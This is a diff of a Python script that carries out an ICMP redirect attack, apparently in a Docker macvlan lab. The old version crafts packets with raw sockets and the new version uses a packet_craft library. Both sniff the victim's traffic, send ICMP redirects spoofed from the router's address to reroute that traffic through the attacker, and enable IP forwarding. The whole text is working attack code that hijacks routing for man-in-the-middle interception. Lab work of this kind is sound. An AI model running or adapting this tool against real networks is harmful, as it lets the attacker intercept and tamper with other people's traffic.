@@ -1,295 +1,294 @@
 #!/usr/bin/env python3
 """
-ICMP Redirect Attack - Raw Socket Implementation
-This script implements an ICMP Redirect attack without using external libraries like Scapy.
-It sniffs for victim traffic and sends ICMP redirect messages to poison the victim's routing table.
+ICMP Redirect Attack - Macvlan Implementation
+==============================================
+This script performs an ICMP redirect attack in a macvlan environment where
+the attacker can actually see victim traffic due to Layer 2 visibility.
+
+Key Features:
+- Uses common packet_craft.py library for packet operations
+- Real traffic sniffing in macvlan environment  
+- Reactive ICMP redirects based on observed traffic
+- Proper ICMP redirect packet structure per RFC 792
+- Comprehensive logging and monitoring
+
+Network Setup:
+- All containers on same macvlan network (10.9.0.0/24)
+- Attacker can see all L2 traffic via promiscuous mode
+- No need for ARP spoofing or other workarounds
 """
 
-import socket
-import struct
-import atexit
-import time
 import sys
-import subprocess
+import time
 import threading
+import signal
+import atexit
+from packet_craft import *
 
-# ─── CONFIG ─────────────────────────────────────────────────────────────────────
-VICTIM_IP = "10.9.0.5"        # Victim's IP
-ROUTER_IP = "10.9.0.11"       # Router's IP 
-ATTACKER_IP = "10.9.0.105"    # Attacker's IP (us)
-TARGET_IP = "192.168.60.5"    # Target's IP on the other network
-IFACE = "eth0"                # Interface to sniff on
+# ═══════════════════════════════════════════════════════════════════════════════════
+# ATTACK CONFIGURATION
+# ═══════════════════════════════════════════════════════════════════════════════════
 
-# ─── PACKET CRAFTING ─────────────────────────────────────────────────────────────
-def checksum(data: bytes) -> int:
-    """Compute Internet checksum for the data"""
-    if len(data) % 2:
-        data += b'\x00'
-    s = sum(struct.unpack(f"!{len(data)//2}H", data))
-    s = (s >> 16) + (s & 0xffff)
-    s += s >> 16
-    return ~s & 0xffff
+# Network Configuration (Macvlan Setup)
+VICTIM_IP = "10.9.0.5"      # Target of ICMP redirect attack
+ATTACKER_IP = "10.9.0.105"  # Our IP (attacker)
+ROUTER_IP = "10.9.0.11"     # Legitimate gateway IP
+TARGET_IP = "10.9.0.200"    # Target server victim tries to reach
+TARGET2_IP = "10.9.0.201"   # Alternative target server
 
-def create_ip_header(src_ip, dst_ip, proto, payload_len, ttl=64):
-    """Create an IP header"""
-    # IP header fields
-    ip_ver_ihl = (4 << 4) | 5  # Version 4, IHL 5 words (20 bytes)
-    ip_tos = 0  # Type of Service
-    ip_tot_len = 20 + payload_len  # Total length (header + payload)
-    ip_id = 0xabcd  # Identification
-    ip_frag_off = 0  # Fragment offset
-    ip_ttl = ttl  # Time to Live
-    ip_proto = proto  # Protocol
-    ip_check = 0  # Checksum (calculated later)
-    ip_saddr = socket.inet_aton(src_ip)  # Source address
-    ip_daddr = socket.inet_aton(dst_ip)  # Destination address
+# Attack Configuration
+INTERFACE = "eth1"           # Network interface for packet capture (macvlan)
+MAX_REDIRECTS = 10           # Maximum redirects to send per session
+REDIRECT_DELAY = 0.1         # Delay between redirects (seconds)
 
-    # Pack the IP header
-    ip_header = struct.pack(
-        '!BBHHHBBH4s4s',
-        ip_ver_ihl, ip_tos, ip_tot_len,
-        ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
-        ip_saddr, ip_daddr
-    )
+# ═══════════════════════════════════════════════════════════════════════════════════
+# GLOBAL STATE
+# ═══════════════════════════════════════════════════════════════════════════════════
 
-    # Calculate and update the checksum
-    ip_check = checksum(ip_header)
-    ip_header = ip_header[:10] + struct.pack('!H', ip_check) + ip_header[12:]
+attack_active = True
+redirects_sent = 0
+packets_seen = 0
+target_traffic_seen = 0
 
-    return ip_header
-
-def create_icmp_redirect(gateway_ip, orig_packet):
-    """Create an ICMP redirect message"""
-    icmp_type = 5  # Redirect
-    icmp_code = 1  # Redirect for host
-    icmp_check = 0  # Checksum (calculated later)
-    gateway = socket.inet_aton(gateway_ip)  # New gateway address
-    
-    # Per RFC 792, ICMP redirect contains the IP header + first 8 bytes of original datagram
-    original_data = orig_packet[:28]  # IP header (20 bytes) + first 8 bytes of data
-    
-    # Create the ICMP header
-    icmp_header = struct.pack('!BBH4s', icmp_type, icmp_code, icmp_check, gateway)
-    
-    # Combine with original data
-    icmp_packet = icmp_header + original_data
-    
-    # Calculate and update the checksum
-    icmp_check = checksum(icmp_packet)
-    icmp_packet = struct.pack('!BBH4s', icmp_type, icmp_code, icmp_check, gateway) + original_data
-    
-    return icmp_packet
-
-# ─── PACKET SNIFFING ─────────────────────────────────────────────────────────────
-def setup_raw_socket():
-    """Create a raw socket for packet sniffing"""
-    try:
-        # Create a raw socket to capture all IP packets
-        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
-        s.bind((IFACE, 0))
-        return s
-    except socket.error as e:
-        print(f"Error creating socket: {e}")
-        sys.exit(1)
-
-def extract_ip_packet(packet):
-    """Extract the IP packet from Ethernet frame"""
-    # Skip the Ethernet header (14 bytes)
-    ip_packet = packet[14:]
-    return ip_packet
-
-def parse_ip_header(ip_packet):
-    """Parse IP header fields"""
-    if len(ip_packet) < 20:
-        return None
-        
-    # Unpack IP header
-    iph = struct.unpack('!BBHHHBBH4s4s', ip_packet[:20])
-    
-    version_ihl = iph[0]
-    version = version_ihl >> 4
-    ihl = version_ihl & 0xF
-    
-    protocol = iph[6]
-    src_addr = socket.inet_ntoa(iph[8])
-    dst_addr = socket.inet_ntoa(iph[9])
-    
-    return {
-        'version': version,
-        'header_length': ihl * 4,
-        'protocol': protocol,
-        'src': src_addr,
-        'dst': dst_addr,
-        'raw': ip_packet[:20]
-    }
-
-# ─── ATTACK FUNCTIONS ─────────────────────────────────────────────────────────────
-def send_icmp_redirect(victim_packet):
-    """Send ICMP redirect to the victim"""
-    # Create the IP header (router -> victim)
-    ip_hdr = create_ip_header(
-        src_ip=ROUTER_IP,       # Spoof as router
-        dst_ip=VICTIM_IP,       # Send to victim
-        proto=1,                # ICMP
-        payload_len=8 + 28      # ICMP header + original data
-    )
-    
-    # Create the ICMP redirect message
-    icmp_redirect = create_icmp_redirect(
-        gateway_ip=ATTACKER_IP,   # Redirect to us
-        orig_packet=victim_packet # Original packet
-    )
-    
-    # Combine the packet
-    packet = ip_hdr + icmp_redirect
-    
-    # Send the packet
-    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
-        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        s.sendto(packet, (VICTIM_IP, 0))
-    
-    print(f"✅ Sent ICMP redirect to {VICTIM_IP}")
-    print(f"   Redirecting traffic for {TARGET_IP} to {ATTACKER_IP}")
-
-def process_packet(packet):
-    """Process a captured packet and send redirect if it's from victim to target"""
-    # Extract and parse IP header
-    ip_packet = extract_ip_packet(packet)
-    if not ip_packet:
-        return
-        
-    ip_header = parse_ip_header(ip_packet)
-    if not ip_header:
-        return
-    
-    # Debug: Print all packets from victim to help troubleshoot
-    if ip_header['src'] == VICTIM_IP:
-        print(f"🔍 Detected victim packet: {VICTIM_IP} -> {ip_header['dst']}")
-    
-    # Check if this is traffic from victim to target network (not just specific target)
-    if (ip_header['src'] == VICTIM_IP and ip_header['dst'].startswith('192.168.60.')):
-        print(f"🎯 Target traffic detected: {VICTIM_IP} -> {ip_header['dst']}")
-        send_icmp_redirect(ip_packet)
-
-def setup_ip_forwarding():
-    """Enable IP forwarding to allow traffic to flow through attacker"""
-    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-        f.write('1')
-    print("✅ Enabled IP forwarding")
+def signal_handler(sig, frame):
+    """Handle Ctrl+C gracefully"""
+    global attack_active
+    print(f"\n🛑 Attack interrupted by user")
+    attack_active = False
+    sys.exit(0)
 
 def cleanup():
     """Cleanup function called on exit"""
-    print("\n🧹 Cleaning up...")
-    print("⚠️  Remember to check victim's routing table for redirected routes")
-    print("   Run: docker exec victim ip route")
+    global redirects_sent, packets_seen, target_traffic_seen
+    print(f"\n🧹 Attack Summary:")
+    print(f"   📊 Packets observed: {packets_seen}")
+    print(f"   🎯 Target traffic detected: {target_traffic_seen}")
+    print(f"   📤 ICMP redirects sent: {redirects_sent}")
+    if redirects_sent > 0:
+        print(f"   💡 To verify attack success, check victim routing externally")
 
-# ─── MAIN FUNCTION ─────────────────────────────────────────────────────────────────
-def trigger_victim_traffic():
-    """Trigger victim to send traffic to target, then capture it"""
-    print("🔥 Triggering victim to send traffic to target...")
+def setup_ip_forwarding():
+    """Enable IP forwarding on attacker to handle redirected traffic"""
+    try:
+        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+            f.write('1')
+        print("✅ Enabled IP forwarding on attacker")
+        return True
+    except Exception as e:
+        print(f"⚠️  Failed to enable IP forwarding: {e}")
+        return False
+
+def send_icmp_redirect(original_packet, victim_ip, gateway_ip=ATTACKER_IP):
+    """
+    Send ICMP redirect message to victim
     
-    def victim_ping():
+    Args:
+        original_packet: The original IP packet that triggered this redirect
+        victim_ip: IP address of victim to send redirect to
+        gateway_ip: New gateway IP to redirect traffic to (default: attacker)
+    """
+    global redirects_sent
+    
+    try:
+        # Create ICMP redirect payload
+        icmp_redirect = create_icmp_redirect(gateway_ip, original_packet)
+        
+        # Create IP header (spoofed from router to victim)
+        ip_header = create_ip_header(
+            src_ip=ROUTER_IP,        # Spoof as legitimate router
+            dst_ip=victim_ip,        # Send to victim
+            proto=1,                 # ICMP protocol
+            payload_len=len(icmp_redirect)
+        )
+        
+        # Combine into complete packet
+        redirect_packet = ip_header + icmp_redirect
+        
+        # Send the redirect
+        if send_packet(redirect_packet, victim_ip):
+            redirects_sent += 1
+            print(f"📤 ICMP redirect #{redirects_sent} sent to {victim_ip}")
+            print(f"   Redirecting traffic to {gateway_ip} (spoofed from {ROUTER_IP})")
+            return True
+        else:
+            print(f"❌ Failed to send ICMP redirect to {victim_ip}")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Error sending ICMP redirect: {e}")
+        return False
+
+def analyze_packet(ip_packet):
+    """
+    Analyze captured IP packet and determine if it should trigger a redirect
+    
+    Args:
+        ip_packet: Raw IP packet bytes
+        
+    Returns:
+        True if redirect was sent, False otherwise
+    """
+    global target_traffic_seen
+    
+    # Parse IP header
+    ip_header = parse_ip_header(ip_packet)
+    if not ip_header:
+        return False
+        
+    src_ip = ip_header['src']
+    dst_ip = ip_header['dst']
+    protocol = ip_header['protocol']
+    
+    # Check if this is victim traffic to our target servers
+    if (src_ip == VICTIM_IP and 
+        (dst_ip == TARGET_IP or dst_ip == TARGET2_IP or dst_ip.startswith("10.9.0.2"))):
+        
+        target_traffic_seen += 1
+        print(f"🎯 Target traffic detected: {src_ip} → {dst_ip} (protocol {protocol})")
+        
+        # Send ICMP redirect to victim
+        return send_icmp_redirect(ip_packet, VICTIM_IP)
+    
+    # Also redirect if victim tries to reach any server beyond router
+    elif (src_ip == VICTIM_IP and 
+          not dst_ip.startswith("10.9.0.") and
+          dst_ip != "127.0.0.1"):
+        
+        target_traffic_seen += 1
+        print(f"🌐 External traffic detected: {src_ip} → {dst_ip}")
+        return send_icmp_redirect(ip_packet, VICTIM_IP)
+    
+    return False
+
+def packet_sniffer():
+    """
+    Main packet sniffing loop - captures and analyzes traffic
+    """
+    global attack_active, packets_seen
+    
+    print(f"📡 Starting packet capture on {INTERFACE}...")
+    print(f"🔍 Monitoring for victim traffic: {VICTIM_IP} → targets")
+    
+    try:
+        # Create packet socket for capturing
+        sock = create_packet_socket(INTERFACE)
+        sock.settimeout(1.0)  # 1 second timeout for non-blocking operation
+        
+        while attack_active:
+            try:
+                # Capture packet
+                frame, addr = sock.recvfrom(65535)
+                packets_seen += 1
+                
+                # Extract IP packet from Ethernet frame
+                ip_packet = extract_ethernet_payload(frame)
+                if not ip_packet:
+                    continue
+                    
+                # Analyze packet and potentially send redirect
+                analyze_packet(ip_packet)
+                
+                # Rate limiting
+                if redirects_sent >= MAX_REDIRECTS:
+                    print(f"🛑 Maximum redirects ({MAX_REDIRECTS}) reached. Stopping attack.")
+                    break
+                    
+                # Brief delay to avoid overwhelming the network
+                time.sleep(REDIRECT_DELAY)
+                
+            except socket.timeout:
+                # Timeout is normal, continue
+                continue
+            except socket.error as e:
+                if attack_active:  # Only print error if we're still supposed to be running
+                    print(f"⚠️  Socket error: {e}")
+                break
+                
+    except Exception as e:
+        print(f"❌ Packet sniffing error: {e}")
+    finally:
         try:
-            subprocess.run([
-                'docker', 'exec', 'victim', 'ping', '-c', '1', TARGET_IP
-            ], capture_output=True, timeout=10)
+            sock.close()
         except:
             pass
+
+def monitor_attack_progress():
+    """
+    Monitor attack progress by analyzing network traffic patterns
+    """
+    print(f"📊 Starting attack progress monitor...")
     
-    # Start ping in background
-    ping_thread = threading.Thread(target=victim_ping)
-    ping_thread.start()
-    
-    # Give it a moment to start
-    time.sleep(1)
-    
-    return ping_thread
+    while attack_active:
+        try:
+            time.sleep(10)  # Check every 10 seconds
+            
+            if redirects_sent > 0:
+                print(f"📈 Attack Progress: {redirects_sent} redirects sent, {target_traffic_seen} target packets seen")
+                
+                if redirects_sent >= 5:
+                    print(f"� Multiple redirects sent - victim routing may be affected")
+                    print(f"� To verify success, check victim routing externally:")
+                    print(f"   docker exec victim ip route")
+            
+        except Exception as e:
+            if attack_active:
+                print(f"⚠️  Error monitoring attack progress: {e}")
+            break
 
 def main():
-    """Main function"""
-    print("🚀 ICMP Redirect Attack")
-    print("======================================")
-    print(f"Victim: {VICTIM_IP}")
-    print(f"Router: {ROUTER_IP}")
-    print(f"Attacker: {ATTACKER_IP}")
-    print(f"Target: {TARGET_IP}")
-    print("======================================")
+    """Main attack function"""
+    global attack_active
     
-    # Register cleanup
+    print("🚀 ICMP Redirect Attack - Macvlan Version")
+    print("==========================================")
+    print(f"🎯 Target: {VICTIM_IP} (victim)")
+    print(f"👹 Attacker: {ATTACKER_IP} (us)")
+    print(f"🌐 Router: {ROUTER_IP} (spoofed source)")
+    print(f"🎯 Targets: {TARGET_IP}, {TARGET2_IP}")
+    print(f"📡 Interface: {INTERFACE}")
+    print("==========================================")
+    
+    # Register cleanup and signal handlers
     atexit.register(cleanup)
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
     
-    # Enable IP forwarding
-    setup_ip_forwarding()
+    # Setup environment
+    if not setup_ip_forwarding():
+        print("❌ Failed to setup IP forwarding. Continuing anyway...")
     
-    print("📡 Starting ICMP Redirect Attack...")
-    print("⚠️  Note: Modern kernels require ICMP redirects to reference actual traffic")
-    print("    Triggering victim traffic first, then sending redirects")
+    print("\n🔧 Attack Prerequisites:")
+    print("   ✅ Macvlan network provides L2 visibility")
+    print("   ✅ Attacker interface in promiscuous mode") 
+    print("   ✅ Victim accepts ICMP redirects")
+    print("   ✅ Using realistic packet crafting")
+    
+    print(f"\n📊 Attack Statistics:")
+    print(f"   Max redirects: {MAX_REDIRECTS}")
+    print(f"   Redirect delay: {REDIRECT_DELAY}s")
+    
+    # Start monitoring thread
+    monitor_thread = threading.Thread(target=monitor_attack_progress, daemon=True)
+    monitor_thread.start()
+    
+    print(f"\n🎬 Starting Attack...")
+    print(f"💡 Generate victim traffic with: docker exec victim ping {TARGET_IP}")
+    print(f"📊 Monitor with: docker exec victim ip route")
+    print(f"⏹️  Stop with: Ctrl+C")
     print("")
     
     try:
-        for count in range(1, 4):
-            print(f"🔄 Attack attempt #{count}")
-            
-            # Trigger victim to send traffic
-            ping_thread = trigger_victim_traffic()
-            
-            # Wait a moment for the packet to be sent
-            time.sleep(2)
-            
-            print(f"� Sending ICMP redirect #{count} to {VICTIM_IP}")
-            
-            # Create a realistic packet that victim would send
-            realistic_packet = create_dummy_packet()
-            send_icmp_redirect(realistic_packet)
-            
-            # Wait for ping to complete
-            ping_thread.join(timeout=5)
-            
-            # Check victim's routing table
-            print("   Checking victim's routing table...")
-            time.sleep(2)
-            
-            print(f"   Run: docker exec victim ip route")
-            
-        print("✅ Attack sequence complete!")
-        print("   Check victim's routing table with: docker exec victim ip route")
-                
+        # Start packet sniffing (blocks until attack_active becomes False)
+        packet_sniffer()
+        
     except KeyboardInterrupt:
-        print("\n🛑 Attack stopped by user")
-        sys.exit(0)
-
-def create_dummy_packet():
-    """Create a dummy IP packet from victim to target to trigger redirect"""
-    # IP header
-    version = 4
-    ihl = 5
-    tos = 0
-    tot_len = 28  # IP header (20) + ICMP header (8)
-    id = 12345
-    frag_off = 0
-    ttl = 64
-    protocol = 1  # ICMP
-    check = 0
-    saddr = socket.inet_aton(VICTIM_IP)
-    daddr = socket.inet_aton(TARGET_IP)
-    
-    # Pack IP header
-    ip_header = struct.pack('!BBHHHBBH4s4s', 
-                           (version << 4) + ihl, tos, tot_len, id, frag_off, 
-                           ttl, protocol, check, saddr, daddr)
-    
-    # Calculate IP checksum
-    ip_checksum = checksum(ip_header)
-    ip_header = struct.pack('!BBHHHBBH4s4s', 
-                           (version << 4) + ihl, tos, tot_len, id, frag_off, 
-                           ttl, protocol, ip_checksum, saddr, daddr)
-    
-    # Simple ICMP ping payload
-    icmp_header = struct.pack('!BBHHH', 8, 0, 0, 12345, 1)  # Echo request
-    icmp_checksum = checksum(icmp_header)
-    icmp_header = struct.pack('!BBHHH', 8, 0, icmp_checksum, 12345, 1)
-    
-    return ip_header + icmp_header
+        print(f"\n🛑 Attack stopped by user")
+    except Exception as e:
+        print(f"\n❌ Attack failed: {e}")
+    finally:
+        attack_active = False
+        
+    print(f"\n✅ Attack completed")
 
 if __name__ == "__main__":
     main()
